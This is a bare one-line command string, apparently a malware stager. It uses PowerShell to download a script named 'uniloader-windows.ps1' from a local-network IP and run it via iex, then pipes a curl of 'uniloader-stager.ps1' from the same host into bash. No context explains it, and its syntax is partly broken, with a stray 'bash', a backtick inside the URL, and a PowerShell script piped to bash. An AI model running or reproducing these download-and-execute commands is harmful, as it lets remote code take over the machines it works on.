iwr -uri 'http://192.168.1.26/uniloader-windows.ps1'|iex;bash curl 'http://192.168.1.26/uniloader-stager.ps1`' | bash